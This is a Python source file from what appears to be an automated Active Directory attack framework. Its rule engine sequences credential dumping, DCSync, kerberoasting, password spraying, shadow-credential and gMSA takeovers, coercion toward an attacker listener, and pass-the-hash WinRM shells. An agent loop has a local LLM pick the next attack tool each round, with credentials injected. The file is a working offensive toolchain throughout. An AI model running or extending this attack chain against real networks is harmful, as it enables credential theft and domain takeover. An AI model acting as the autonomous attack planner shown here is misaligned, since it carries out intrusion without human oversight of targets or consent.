            **creds, "username": acct, "password": "", "nt_hash": nth,
        }

    # ── Priority 0: Post-exploitation (already have shell) ────────────────────
    if owned:
        target   = owned[0].get("machine", dc)
        own_user = owned[0].get("user", u)
        own_hash = _real_nt_hash(owned[0].get("nt_hash", h))
        own_pass = "" if own_hash else p
        owned_creds = {"dc_ip": dc, "domain": dom,
                       "username": own_user, "password": own_pass, "nt_hash": own_hash}

        if not _done("windows_privesc_recon"):
            return "windows_privesc_recon", {"target_ip": target, **owned_creds}
        if not _done("credential_dump"):
            return "credential_dump", {"target_ip": target, **owned_creds}
        if not _done("credential_loot"):
            return "credential_loot", {**owned_creds, "dc_ip": target}
        if not _done("jea_enum"):
            return "jea_enum", owned_creds
        # DCSync when we have a shell on the DC — regardless of is_da flag.
        # gMSA accounts with replication rights won't appear as DA in whoami /all
        # but secretsdump -just-dc still works; this ensures we don't stop here.
        if not _done("dcsync_attack") and (target == dc or not dc):
            return "dcsync_attack", {**owned_creds}

    if owned and not _done("lateral_movement"):
        target = owned[0].get("machine", dc)
        owned_hash = _real_nt_hash(owned[0].get("nt_hash", h))
        return "lateral_movement", {
            "target_ip": target, "domain": dom,
            "username": owned[0].get("user", u),
            "password": "" if owned_hash else p,
            "nt_hash": owned_hash,
            "command": "whoami /all & hostname & ipconfig /all",
            "method": "winrm"
        }

    if intel.get("winrm_targets") and not _done("evil_winrm") and u not in winrm_dead_users:
        return "evil_winrm", {**creds, "target_ip": intel["winrm_targets"][0]}

    # ── Priority 0c: ADCS scan early (before WinRM probing) ───────────────────
    # On ADCS boxes (for example ESC13-style paths) WinRM/lateral paths can fail
    # until certificate-based privilege is discovered. Run adcs_scan once after
    # baseline recon+LDAP, while no shell-capable hash is in hand. Gated tightly
    # so it does not disturb other targets:
    #   • only AFTER recon+enumeration ran (nmap + ldap) — never pre-empts the
    #     normal recon→enum→exploit methodology or fires on round 1,
    #   • only when a Kerberos TGT exists (krb) — keeps request_tgt ahead of it,
    #   • only once (not _done) — cannot loop.
    # NOT gated on loot/NT-hash: ADCS ESC (ESC1/ESC13/…) is an independent
    # escalation surface that must be enumerated even when a (possibly useless,
    # e.g. UnPAC) hash is already in hand — standard AD methodology.
    # Fully target-agnostic: adcs_scan is read-only enumeration that is a no-op on
    # non-ADCS targets, so a box without a CA just continues the normal chain.
    if (not _done("adcs_scan") and krb
            and _done("nmap_scan") and _done("enumerate_ldap")):
        return "adcs_scan", {**creds, "auto_exploit": True}

    # A second ADCS attempt is only justified when the earlier scan ran without
    # Kerberos, found an ESC path, and did not mint a usable shell-ready ccache.
    # This preserves the original "retry after TGT" intent without allowing a
    # late duplicate certipy find/req after a normal Kerberos ADCS run.
    _cc_valid_now = _ccache_is_valid(cc)
    if (_done("adcs_scan")
            and _esc_found
            and _cc_valid_now
            and _calls("adcs_scan") < 2
            and intel.get("last_adcs_needs_retry_after_tgt")
            and not intel.get("last_adcs_scan_used_kerberos")
            and not intel.get("adcs_shell_ready")
            and "adcs_scan" not in exclude):
        return "adcs_scan", {**creds, "auto_exploit": True}

    # ── Priority 1: Have NT hash → try to get shell immediately ──────────────
    # Skip WinRM probing entirely if previous attempts proved this principal
    # cannot WinRM (avoids the discover_winrm_access infinite loop).
    if loot and not _done("evil_winrm"):
        for acct, value in loot.items():
            if str(acct) in winrm_dead_users:
                continue
            first_hash = _real_nt_hash(value)
            if first_hash:
                if _calls("discover_winrm_access") < 2 and not _done("discover_winrm_access"):
                    tool = "discover_winrm_access"
                else:
                    tool = "evil_winrm"
                return tool, {
                    **creds,
                    "username": str(acct),
                    "password": "",
                    "nt_hash": first_hash,
                }

    if intel["nt_hashes"] and not _done("evil_winrm") and u not in winrm_dead_users:
        first_hash = next((_real_nt_hash(v) for v in intel["nt_hashes"].values()
                           if _real_nt_hash(v)), "")
        if first_hash:
            if _calls("discover_winrm_access") < 2 and not _done("discover_winrm_access"):
                tool = "discover_winrm_access"
            else:
                tool = "evil_winrm"
            return tool, {**creds, "nt_hash": first_hash}

    if intel["ccaches"] and not _done("evil_winrm") and u not in winrm_dead_users:
        # Use the freshest ccache (certipy auth overwrites KRB5CCNAME)
        fresh_cc = intel["ccaches"][-1]
        return "evil_winrm", {**creds, "nt_hash": "", "password": ""}

    if intel.get("adcs_shell_ready") and _calls("evil_winrm") < 2 and u not in winrm_dead_users:
        # ADCS exploit got a new ccache — force Kerberos, ignore hash/password
        return "evil_winrm", {**creds, "nt_hash": "", "password": ""}

    valid_creds = [c for c in intel.get("valid_creds", []) if _real_secret(c.get("password", ""))]

    def _cred_marker(c: dict) -> tuple:
        return (
            str(c.get("user", "")).split("@")[0].split("\\")[-1].lower(),
            _real_secret(c.get("password", "")),
            _real_nt_hash(c.get("nt_hash", "")),
        )

    tested_cred_markers = {
        _cred_marker(c) for c in (intel.get("valid_creds_tested", []) or [])
        if isinstance(c, dict)
    }
    validated_creds = [
        c for c in (intel.get("validated_creds", []) or [])
        if isinstance(c, dict)
    ]

    def _validation_for(c: dict) -> dict:
        mark = _cred_marker(c)
        for item in validated_creds:
            if _cred_marker(item) == mark:
                return item
        return {}

    pending_valid_creds = [
        c for c in valid_creds
        if _cred_marker(c) not in tested_cred_markers
    ]
    if pending_valid_creds and _calls("test_credential") < max(3, len(valid_creds) + 1):
        vc = pending_valid_creds[0]
        return "test_credential", {
            "dc_ip": dc, "domain": dom,
            "username": vc.get("user", ""),
            "password": vc.get("password", ""),
            "nt_hash": "",
        }

    machine_creds = [
        c for c in valid_creds
        if str(c.get("user", "")).strip().endswith("$")
    ]
    if machine_creds and intel.get("gmsa_candidates"):
        tried_gmsa = list(intel.get("gmsa_read_tried_for", []) or [])
        for mc in machine_creds:
            mc_user = str(mc.get("user", "")).strip()
            if not mc_user:
                continue
            mc_dead = any(_same_ad_account(mc_user, dead) for dead in gmsa_read_dead_users)
            mc_tried = any(_same_ad_account(mc_user, seen) for seen in tried_gmsa)
            if mc_dead or mc_tried:
                continue
            return "gmsa_read", {
                "dc_ip": dc, "domain": dom,
                "username": mc_user,
                "password": mc.get("password", ""),
                "nt_hash": "",
            }
    winrm_valid_creds = [
        c for c in valid_creds
        if _validation_for(c).get("winrm")
    ]
    if winrm_valid_creds and _calls("evil_winrm") < 2:
        best = winrm_valid_creds[0]
        validation = _validation_for(best)
        best_user = best.get("user", u)
        if best_user in winrm_dead_users:
            pass  # fall through, don't burn rounds on a dead WinRM principal
        else:
            target = (validation.get("winrm") or intel.get("winrm_targets") or [dc])[0]
            return "evil_winrm", {
                **creds,
                "username": best_user,
                "password": best.get("password", ""),
                "nt_hash": "",
                "target_ip": target,
            }

    # ── Network unreachable: nothing else can succeed ────────────────────────
    # If every prior probe says "No route to host" / timeout, only nmap_scan
    # is meaningful. Keep proposing it so the user sees the dead target.
    if network_dead and not _done("nmap_scan"):
        return "nmap_scan", {"target_ip": dc}

    # ── Priority 2: NTLM disabled → get Kerberos ticket ─────────────────────
    # Only pivot after at least one credentialed enum/auth tool has actually
    # tried and produced a Kerberos-required signal. Nmap's NTLM banner alone is
    # not enough evidence; normal AD flow is nmap -> LDAP enum before TGT.
    if (_enum_attempted()
            and (ntlm_off or intel["ntlm_disabled"])
            and not (krb and _ccache_is_valid(cc))):
        if not _done("request_tgt"):
            return "request_tgt", creds

    # ── Priority 3: Always start with recon ──────────────────────────────────
    if not _done("nmap_scan"):
        return "nmap_scan", {"target_ip": dc}

    # ── Priority 3.5 (no-cred): null session → RID cycling → AS-REP roast ────
    # Real engagements often start with zero credentials. Anonymous LDAP and
    # null SMB session can enumerate users; AS-REP roast doesn't need creds.
    if not u and not p and not h and not krb:
        if not _done("enumerate_ldap"):
            # Anonymous LDAP enumeration (null session)
            return "enumerate_ldap", {"dc_ip": dc, "domain": dom,
                                       "username": "", "password": ""}
        if not _done("enumerate_shares"):
            # SMB null/guest share exposure and SYSVOL/GPP checks
            return "enumerate_shares", {"dc_ip": dc, "domain": dom,
                                        "username": "", "password": ""}
        if not _done("no_cred_surface_recon"):
            # HTTP/ADCS/WSUS/MSSQL/LDAP RootDSE no-credential surface checks
            return "no_cred_surface_recon", {"dc_ip": dc, "domain": dom}
        if not _done("kerbrute_enum"):
            # RID cycling / username enumeration without credentials
            return "kerbrute_enum", {"dc_ip": dc, "domain": dom}
        if not _done("asrep_roast"):
            # AS-REP roast — no credentials needed, just usernames
            return "asrep_roast", {"dc_ip": dc, "domain": dom,
                                    "username": "", "password": ""}
        if not _done("timeroast"):
            return "timeroast", {"dc_ip": dc, "domain": dom}
        if not _done("pre2k_attack"):
            return "pre2k_attack", {"dc_ip": dc, "domain": dom}
        _listener_ip = _attacker_ip()
        if not ntlm_off and _listener_ip and not _done("coercion_attack"):
            return "coercion_attack", {
                "dc_ip": dc, "domain": dom, "username": "",
                "password": "", "attacker_ip": _listener_ip,
            }
        # If we got creds from the above, re-enter the main loop
        new_u = SESSION.get("username", "")
        new_p = _real_secret(SESSION.get("password", ""))
        if new_u or new_p:
            return "enumerate_ldap", {"dc_ip": dc, "domain": dom,
                                       "username": new_u, "password": new_p}
        return "agent_complete", {"status": "partial",
                                   "summary": "No credentials obtained from null-session enumeration"}

    # ── Priority 4: Enumerate — foundation for all attacks ───────────────────
    if not _done("enumerate_ldap"):
        return "enumerate_ldap", creds
    if not _done("enumerate_shares"):
        return "enumerate_shares", creds

    # ── Priority 4.5: Mine readable shares for credentials FIRST ────────────
    # When share enum surfaces a "loot-shaped" share (Logs, Trace, Audit,
    # Backup, Scripts, Configs, IT, Public), credential leaks in those files
    # are often the shortest path to a more powerful identity. Run the
    # downloader+parser before BloodHound so the next round's ACL discovery
    # uses the better principal. Many labs and real environments hide the
    # useful ACL edge behind a second credential found in operational files.
    _loot_share_markers = (
        "logs", "log", "trace", "audit", "backup", "backups",
        "scripts", "configs", "config", "it", "public",
    )
    _has_loot_share = any(
        any(m in str(s).lower() for m in _loot_share_markers)
        for s in (intel.get("readable_shares") or [])
    )
    if _has_loot_share and not _done("auto_loot_chain"):
        return "auto_loot_chain", creds

    # ── Priority 3.5: LAPS — quick win before burning rounds on other paths ────
    # Many environments have LAPS; a single ldap query reveals local admin creds.
    if not _done("laps_read") and (p or h or krb):
        return "laps_read", creds

    # ── Priority 4.6: Early roast when SPNs / AS-REP targets already known ───
    # LDAP enum (Priority 4) populates intel["spns"] and intel["asrep_users"].
    # If targets are known NOW, roast before spending a round on ADCS so the
    # cracked hash can drive the next decision (WinRM, PTH, pivot).
    if intel["spns"] and not _done("kerberoast"):
        return "kerberoast", creds
    if intel["asrep_users"] and not _done("asrep_roast"):
        return "asrep_roast", creds

    # ── Priority 4.7: NTLM enabled + have password/hash → try shell FIRST ───
    # On NTLM-enabled machines the fastest DA path is direct auth, not ADCS.
    # Skip when NTLM is known-off (Kerberos-only DCs need ADCS/ACL paths).
    if not ntlm_off and (p or h) and u not in winrm_dead_users:
        if not _done("discover_winrm_access") and _calls("discover_winrm_access") < 2:
            return "discover_winrm_access", creds
        if not _done("evil_winrm"):
            return "evil_winrm", creds

    # ── Priority 5: Certificate attacks (often path to DA) ───────────────────
    # If ESC was found in loot but no TGT → request_tgt before adcs exploit
    _cc_valid  = _ccache_is_valid(cc)
    if _esc_found and not _cc_valid and not _done("request_tgt"):
        return "request_tgt", creds

    if (not _done("adcs_scan") and krb
            and _done("nmap_scan") and _done("enumerate_ldap")):
        return "adcs_scan", {**creds, "auto_exploit": True}

    # ACL/gMSA edges are often the shortest path from a standard domain user.
    # Run this before low-probability roasting/flag guesses so gMSA write edges
    # become concrete intel early enough for gmsa_takeover.
    if not acl_scan_dead and not _done("acl_abuse_scan"):
        return "acl_abuse_scan", creds

    # ── Priority 6: Exploit concrete evidence before generic paths ───────────
    usable_acl_paths = [
        (r, _canonical_acl_target(t)) for r, t in intel["acl_paths"]
        if _valid_ad_target(t) or str(t).endswith("$") or _known_gmsa_name(t)
    ]
    gmsa_write_edges = [
        (r, t) for r, t in usable_acl_paths
        if str(t).endswith("$")
        and any(x in str(r).lower() for x in (
            "genericwrite", "genericall", "writedacl", "writeowner", "writeproperty",
        ))
    ]
    if gmsa_write_edges and not _done("gmsa_takeover"):
        _right, gmsa_target = gmsa_write_edges[0]
        return "gmsa_takeover", {**creds, "target_gmsa": str(gmsa_target)}

    force_targets = [
        str(target).strip().strip("'\"")
        for right, target in usable_acl_paths
        if "forcechangepassword" in str(right).lower()
           and str(target).strip().strip("'\"").lower()
              not in {"", "found", "target", "unknown", "all", "account", "user"}
    ]
    if force_targets and "force_change_password_pivot" not in completed_tools:
        admins = {str(x).split("@")[0].lower() for x in intel.get("admin_users", [])}
        admin_like = [
            t for t in force_targets
            if t.split("@")[0].lower() in admins
               or any(mark in t.lower() for mark in ("admin", "da-", "domainadmin"))
        ]
        target = (admin_like or force_targets)[0]
        return "force_change_password_pivot", {**creds, "target_user": target}

    if usable_acl_paths:
        # Prefer a concrete victim object the attacker has rights OVER — never the
        # attacker's own account. Self-targeting shadow-creds/kerberoast is
        # meaningless and fails with KDC_ERR_S_PRINCIPAL_UNKNOWN.
        right, target = next(
            ((r, t) for r, t in usable_acl_paths
             if _valid_ad_target(t) and not _same_ad_account(t, u)),
            next(((r, t) for r, t in usable_acl_paths if _valid_ad_target(t)),
                 usable_acl_paths[0]),
        )
        right_l = str(right).lower()
        # gMSA path: GenericWrite/GenericAll/WriteDACL on $-account → takeover
        # (write msDS-GroupMSAMembership, then read password blob → NT hash → PTH).
        # Plain ReadGMSAPassword (no write edge) falls through to gmsa_read below.
        if str(target).endswith("$"):
            has_write = any(w in right_l for w in (
                "genericwrite", "genericall", "writedacl", "writeowner", "writeproperty",
            ))
            if has_write and not _done("gmsa_takeover"):
                return "gmsa_takeover", {**creds, "target_gmsa": str(target)}
            if not gmsa_read_dead and not _done("gmsa_read"):
                return "gmsa_read", creds
        if "scriptpath" in right_l:
            if not _done("bloodyad") and target:
                return "bloodyad", {
                    **creds, "action": "get object",
                    "target": target, "attribute": "scriptPath",
                }
        if not _done("logon_script_abuse"):
            script_candidates = [
                str(t).strip().strip("'\"")
                for r, t in usable_acl_paths
                if (any(x in str(r).lower() for x in ("genericwrite", "writeproperty", "genericall", "scriptpath"))
                    and _valid_ad_target(t)
                    and not str(t).endswith("$")
                    and not _same_ad_account(t, u))
            ]
            if script_candidates:
                return "logon_script_abuse", {
                    **creds, "target_user": script_candidates[0],
                }
        if "genericwrite" in right_l or "genericall" in right_l or "writeowner" in right_l:
            # Never self-target — the victim must be the object written OVER, not us.
            if (not _done("shadow_credentials_attack") and target
                    and not _same_ad_account(target, u)):
                return "shadow_credentials_attack", {
                    "attacker_user": u, "attacker_pass": p,
                    "target_account": target, "dc_ip": dc, "domain": dom,
                }
        if (not _done("targeted_kerberoast") and target
                and _real_user_target(target) and not _same_ad_account(target, u)):
            return "targeted_kerberoast", {**creds, "target_user": target}

    if intel["gmsa_hashes"] and not _done("evil_winrm"):
        for acct, gh in intel["gmsa_hashes"].items():
            if str(acct) in winrm_dead_users:
                continue
            nth = _real_nt_hash(gh)
            if nth:
                if _calls("discover_winrm_access") < 2 and not _done("discover_winrm_access"):
                    tool = "discover_winrm_access"
                else:
                    tool = "evil_winrm"
                return tool, {**creds, "username": acct, "password": "", "nt_hash": nth}

    if intel["readable_shares"] and not _done("auto_loot_chain"):
        return "auto_loot_chain", creds

    if intel["spns"] and not _done("kerberoast"):
        return "kerberoast", creds

    if intel["asrep_users"] and not _done("asrep_roast"):
        return "asrep_roast", creds

    if intel.get("gmsa_candidates") and not gmsa_read_dead and not _done("gmsa_read"):
        return "gmsa_read", creds

    # ── Priority 7: Kerberos attacks ─────────────────────────────────────────
    if not _done("asrep_roast"):
        return "asrep_roast", creds
    if not _done("kerberoast"):
        return "kerberoast", creds

    # ── Priority 8: Try shell with current creds ─────────────────────────────
    if not _done("evil_winrm") and u not in winrm_dead_users:
        return "evil_winrm", creds

    # ── Priority 9: ACL/BloodHound paths ─────────────────────────────────────
    if not acl_scan_dead and not _done("acl_abuse_scan"):
        return "acl_abuse_scan", creds
    if not _done("collect_bloodhound") and not intel.get("bloodhound_failed_nonblocking"):
        return "collect_bloodhound", creds
    if not _done("query_bloodhound_paths"):
        owned_user = u
        if intel.get("valid_creds"):
            owned_user = intel["valid_creds"][0].get("user", u)
        return "query_bloodhound_paths", {"domain": dom, "owned_user": owned_user}

    if not _done("chain_planner"):
        return "chain_planner", {"dc_ip": dc, "domain": dom}

    # ── Priority 11: Credential hunting in shares ─────────────────────────────
    if not _done("auto_loot_chain"):
        return "auto_loot_chain", creds

    # ── Priority 12: User enumeration (no auth needed) ────────────────────────
    if not _done("kerbrute_enum"):
        return "kerbrute_enum", {"dc_ip": dc, "domain": dom}

    # ── Priority 12b: Test credentials found in LDAP Description fields ─────────
    # Each desc_cred is a {user, password} pair for a specific account.
    _spray_userlist = "/tmp/users.txt"
    desc_creds_pending = [
        c for c in intel.get("valid_creds", [])
        if c.get("auth") == "desc" and c.get("password") and c.get("user")
        and _cred_marker(c) not in tested_cred_markers
    ]
    if desc_creds_pending and _calls("test_credential") < 3:
        dc_c = desc_creds_pending[0]
        return "test_credential", {
            "dc_ip": dc, "domain": dom,
            "username": dc_c["user"], "password": dc_c["password"],
        }

    # Also spray description passwords against all users (may reuse same pw on others)
    desc_pws = [pw for pw in intel.get("desc_passwords", []) if pw and pw != p]
    if desc_pws and _calls("password_spray") < 2 and Path(_spray_userlist).exists():
        return "password_spray", {**creds, "passwords": desc_pws, "userlist": _spray_userlist}

    # ── Priority 13: Password spray with discovered users ────────────────────
    if (p or h) and not _done("password_spray") and Path(_spray_userlist).exists():
        return "password_spray", {**creds, "userlist": _spray_userlist}

    # ── Priority 13a: Trust attacks — enumerate after initial enum ───────────
    if not _done("trust_attack") and (p or h or krb):
        return "trust_attack", {**creds, "attack": "enumerate"}

    # ── Priority 13b: Advanced delegation / pre-auth attacks ─────────────────
    # Unconstrained delegation computers — valuable pivot to DA via TGT capture
    if not _done("unconstrained_delegation"):
        return "unconstrained_delegation", creds

    # RBCD: if ACL scan found GenericWrite on a computer object
    rbcd_targets = [
        str(t) for r, t in (intel.get("acl_paths") or [])
        if str(t).endswith("$") and "genericwrite" in str(r).lower()
        and not any(x in str(r).lower() for x in ("gmsa", "managed"))
    ]
    if rbcd_targets and not _done("rbcd_attack"):
        return "rbcd_attack", {**creds, "target_computer": rbcd_targets[0]}

    # Timeroasting — unauthenticated, always worth trying
    if not _done("timeroast"):
        return "timeroast", {"dc_ip": dc, "domain": dom}

    # Pre2K attack — unauthenticated, common in legacy environments
    if not _done("pre2k_attack"):
        return "pre2k_attack", {"dc_ip": dc, "domain": dom, "username": u, "password": p}

    # Coercion — last resort when attacker_ip is known and NTLM isn't blocked
    _listener_ip = _attacker_ip()
    if not ntlm_off and _listener_ip and not _done("coercion_attack"):
        return "coercion_attack", {**creds, "attacker_ip": _listener_ip}

    # ── User hunt — find lateral movement targets before giving up ───────────
    if not _done("user_hunt") and (p or h or krb):
        return "user_hunt", creds

    # ── SCCM — enterprise environments often have SCCM ───────────────────────
    if not _done("sccm_abuse") and (p or h or krb):
        return "sccm_abuse", creds

    # ── RODC — check for Read-Only DCs ───────────────────────────────────────
    if not _done("rodc_attack") and (p or h or krb):
        return "rodc_attack", creds

    # ── ADIDNS — inject records for hash capture ──────────────────────────────
    if not _done("adidns_abuse") and (p or h or krb):
        return "adidns_abuse", {**creds, "action": "enumerate"}

    # ── GPO — enumerate writable GPOs ─────────────────────────────────────────
    if not _done("gpo_abuse") and (p or h or krb):
        return "gpo_abuse", {**creds, "action": "enumerate"}

    # ── Priority 14: MSSQL lateral movement (if port 1433 detected) ──────────
    # LDAP enum sometimes surfaces SQL SPNs; nmap may show port 1433.
    # Check intel for MSSQL SPN pattern and try xp_cmdshell via PowerUpSQL.
    _mssql_spns = [s for s in intel.get("spns", []) if "mssql" in str(s).lower() or "MSSQLSvc" in str(s)]
    _open_ports  = SESSION.get("agent_intel", {}).get("open_ports", [])
    _has_mssql   = bool(_mssql_spns) or "1433" in _open_ports
    if _has_mssql and not _done("run_module"):
        return "run_module", {"module": "mssql_abuse", "dc_ip": dc, "domain": dom,
                              "username": u, "password": p, "nt_hash": h}

    # ── Priority 15: Coercion + relay (if no NTLM-off and responder usable) ──
    # When we have no other path and the environment allows NTLM, try coercion
    # (PrinterBug / PetitPotam) to capture Net-NTLMv2 and relay to LDAP/SMB.
    # Only suggest — don't auto-execute destructive relay setup.
    if not ntlm_off and not _done("generate_report"):
        # Fall through to report which will list this as a suggestion.
        pass

    # ── Done ──────────────────────────────────────────────────────────────────
    if not _done("generate_report"):
        return "generate_report", {"engagement_name": SESSION.get("engagement", "Agent-Run")}
    return "agent_complete", {"status": "partial", "summary": "All vectors exhausted"}


def _agent_has_progress() -> bool:
    intel = _agent_intel()
    return bool(
        SESSION.get("findings")
        or SESSION.get("owned_users")
        or SESSION.get("owned_machines")
        or SESSION.get("loot")
        or intel.get("flags")
        or intel.get("valid_creds")
        or intel.get("acl_paths")
        or intel.get("esc_vulns")
        or intel.get("nt_hashes")
        or intel.get("ccaches")
        or intel.get("gmsa_candidates")
    )


def _agent_complete_override(completed_tools: list) -> tuple:
    """Block premature mission completion when auth/transport retries are still useful."""
    creds = {
        "dc_ip": SESSION.get("dc_ip", ""),
        "domain": SESSION.get("domain", ""),
        "username": SESSION.get("username", ""),
        "password": SESSION.get("password", ""),
        "nt_hash": SESSION.get("nt_hash", ""),
    }
    intel = _agent_intel()
    enum_attempted = any(name in completed_tools for name in (
        "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
        "acl_abuse_scan", "adcs_scan",
    ))
    for _right, target in _gmsa_write_edges():
        if "guard_gmsa_takeover" not in completed_tools and "gmsa_takeover" not in completed_tools:
            return "gmsa_takeover", {**creds, "target_gmsa": str(target)}, "guard_gmsa_takeover"
    gmsa_read_dead = any(
        _same_ad_account(creds.get("username", ""), dead)
        for dead in (intel.get("gmsa_read_dead_for", []) or [])
    )
    acl_scan_dead = any(
        _same_ad_account(creds.get("username", ""), dead)
        for dead in (intel.get("acl_scan_dead_for", []) or [])
    )
    if (intel.get("gmsa_candidates") and not gmsa_read_dead
            and "guard_gmsa_read" not in completed_tools
            and "gmsa_read" not in completed_tools):
        return "gmsa_read", creds, "guard_gmsa_read"

    cc = SESSION.get("krb5_ccache", "")
    cc_valid = _ccache_is_valid(cc)
    if (SESSION.get("password")
            and enum_attempted
            and (SESSION.get("ntlm_disabled") or intel.get("ntlm_disabled"))
            and not cc_valid
            and "guard_request_tgt" not in completed_tools):
        return "request_tgt", creds, "guard_request_tgt"

    has_material_progress = bool(
        SESSION.get("loot")
        or SESSION.get("owned_users")
        or SESSION.get("owned_machines")
        or intel.get("acl_paths")
        or intel.get("gmsa_hashes")
        or intel.get("nt_hashes")
    )
    if not has_material_progress and not acl_scan_dead and "guard_deep_acl_gmsa_retry" not in completed_tools:
        return "acl_abuse_scan", creds, "guard_deep_acl_gmsa_retry"

    if _agent_has_progress():
        return "", {}, ""

    if cc_valid and "guard_enumerate_ldap_kerberos" not in completed_tools:
        SESSION["use_kerberos"] = True
        return "enumerate_ldap", creds, "guard_enumerate_ldap_kerberos"
    if not acl_scan_dead and "guard_acl_abuse_retry" not in completed_tools:
        return "acl_abuse_scan", creds, "guard_acl_abuse_retry"
    if cc_valid and "guard_bloodhound_kerberos" not in completed_tools:
        SESSION["use_kerberos"] = True
        return "collect_bloodhound", creds, "guard_bloodhound_kerberos"
    if "guard_auto_loot_retry" not in completed_tools:
        return "auto_loot_chain", creds, "guard_auto_loot_retry"
    return "", {}, ""


def _make_fake_tc(name: str, inputs: dict, idx: int):
    """Create a fake tool_call-like object for fallback execution."""
    class _F:
        pass
    tc = _F()
    tc.id = f"fallback_{idx}"
    tc.function = _F()
    tc.function.name = name
    tc.function.arguments = json.dumps(_json_safe(inputs or {}), default=str)
    return tc


# Tool calls that are legitimately repeatable with identical args (re-tries that
# rely on freshly-acquired session state, e.g. a TGT just minted, or a result
# obtained from another tool feeding back in). Everything else gets the loop guard.
_REPEATABLE_TOOLS = {
    "evil_winrm", "lateral_movement",
    "request_tgt",
}

def _stable_args_signature(name: str, inputs: dict) -> str:
    """Stable signature for (tool, args) that ignores secrets and ordering.
    Used to detect when the LLM is asking for the exact same call twice."""
    safe = {}
    for k, v in (inputs or {}).items():
        lk = str(k).lower()
        if lk in {"password", "nt_hash", "hash", "hashes", "lmhash", "nthash",
                  "attacker_pass", "neo4j_password"}:
            # Bucket secret presence, not value — same target with new hash should differ.
            safe[k] = "<set>" if _real_secret(v) else ""
        else:
            safe[k] = v
    try:
        body = json.dumps(safe, sort_keys=True, default=str)
    except Exception:
        body = str(safe)
    return f"{name}::{body}"


def run_agent_ollama(target_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "",
                     model: str = "mistral"):
    """Agent loop using Ollama's local OpenAI-compatible API."""
    _check_runtime_ownership()

    # Clear proxy environment variables
    for _k in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY"]:
        os.environ.pop(_k, None)

    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
        warn("[Agent] Target/domain changed — cleared previous engagement state")
    _reset_agent_runtime_state()
    SESSION.update({"dc_ip": target_ip, "domain": domain,
                    "username": username, "password": password, "nt_hash": nt_hash})

    # Wipe per-run agent_runtime FIRST — BEFORE validating Kerberos state below.
    # Otherwise the validation confirms a ccache that this cleanup then deletes,
    # leaving use_kerberos=True with KRB5CCNAME pointing at a removed file
    # (GSSAPI "no credentials" / vanished ADCS ccache).
    ts              = datetime.now().strftime('%Y%m%d_%H%M%S')
    _clean_agent_output_for_new_run(ts)

    # ── Validate Kerberos state from previous runs ────────────────────────────
    # If SESSION has use_kerberos=True but the ccache file is missing/expired,
    # reset so request_tgt runs first this session.
    _cc = SESSION.get("krb5_ccache", "")
    if SESSION.get("use_kerberos") and (_cc == "" or not Path(_cc).exists()):
        warn(f"[Agent] Stale Kerberos state detected — ccache '{_cc}' missing, resetting")
        SESSION["use_kerberos"] = False
        SESSION["krb5_ccache"]  = ""
        os.environ.pop("KRB5CCNAME", None)
    # Verify ccache is valid (klist check)
    elif _cc and Path(_cc).exists():
        if not _ccache_is_valid(_cc, username, domain):
            warn(f"[Agent] ccache '{_cc}' is expired/invalid — resetting Kerberos state")
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"]  = ""
            os.environ.pop("KRB5CCNAME", None)
        else:
            # ccache is valid — keep Kerberos mode active
            os.environ["KRB5CCNAME"] = _cc
            info(f"[Agent] Valid Kerberos ccache loaded: {_cc}")
    _runtime_path("agent_loot").mkdir(exist_ok=True)
    _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
    log_path        = LOG_DIR / f"agent_ollama_{ts}.json"
    md_path         = LOG_DIR / f"agent_ollama_{ts}.md"
    md_log          = AgentMarkdownLog(md_path, target_ip, domain, model)
    agent_done        = False
    round_num         = 0
    mission_status    = "running"
    completed_tools:  list = []
    no_tool_streak    = 0
    fail_counts:      dict = {}   # tool_name → consecutive failure count
    recent_call_sigs: list = []   # rolling window of (name, args) signatures
    tool_call_counts: dict = {}   # tool_name → total invocations (NOT deduped)
    info(f"Markdown report → {md_path}")

    dc_fqdn = _dc_host_for_kerberos(domain, target_ip)
    krb_status = f"ACTIVE (ccache={SESSION.get('krb5_ccache','')})" if SESSION.get("use_kerberos") else "NOT ACTIVE"
    ntlm_status = "DISABLED" if SESSION.get("ntlm_disabled") else "UNKNOWN (test it)"

    messages = [
        {"role": "system", "content": OLLAMA_SYSTEM},
        {"role": "user",   "content": (
            f"Target: {username}@{domain} -> {target_ip}\n"
            f"Auth: password=[SET], nt_hash=[{'SET' if nt_hash else 'NOT SET'}]\n"
            f"Kerberos: {krb_status}\n"
            f"NTLM: {ntlm_status}\n\n"
            f"Start with nmap_scan to discover what's running, then enumerate and attack based on findings.\n"
            f"Adapt your approach to what you find — every machine is different.\n"
            f"NEVER put credentials in your args — they are auto-injected from session."
        )},
    ]

    while not agent_done and round_num < MAX_ROUNDS:
        round_num += 1

        messages = _trim_ollama_messages(messages)
        ollama_candidates = _ollama_candidate_tools(
            completed_tools, call_counts=tool_call_counts, max_tools=OLLAMA_MAX_TOOLS)
        oai_tools = _tools_to_ollama(
            [name for name, _args in ollama_candidates], compact=True)
        ollama_menu = _ollama_candidate_menu(ollama_candidates)
        messages_for_llm = messages + [{
            "role": "user",
            "content": (
                f"{ollama_menu}\n"
                f"Completed: {list(dict.fromkeys(completed_tools))}\n"
                f"State: {_session_context()}\n"
                "Call exactly one available tool. Credentials are auto-injected."
            )
        }]
        if len(ollama_candidates) == 1 and not OLLAMA_FORCE_LLM_DECISION:
            fallback_name, fallback_inputs = ollama_candidates[0]
            _agent_live_status(
                f"Round {round_num}: using rule engine next action: {fallback_name}")
            response = SimpleNamespace(choices=[SimpleNamespace(
                message=SimpleNamespace(
                    content="",
                    tool_calls=[_make_fake_tc(fallback_name, fallback_inputs, round_num)],
                )
            )])
        else:
            payload_kb = _ollama_payload_size(messages_for_llm, oai_tools) // 1024
            _agent_live_status(
                f"Round {round_num}: asking Ollama model '{model}' for next action "
                f"({len(oai_tools)} tools, payload≈{payload_kb} KB)...")
            try:
                response = _ollama_chat_completion(
                    model=model,
                    messages=messages_for_llm,
                    tools=oai_tools,
                    tool_choice="required",
                    temperature=0.05,
                    max_tokens=512,
                )
            except Exception as e1:
                if OLLAMA_SHOW_FALLBACK_WARNINGS:
                    warn(f"Ollama decision timed out/failed: {e1}")
                fallback_name, fallback_inputs = _pick_next_tool(
                    completed_tools, call_counts=tool_call_counts)
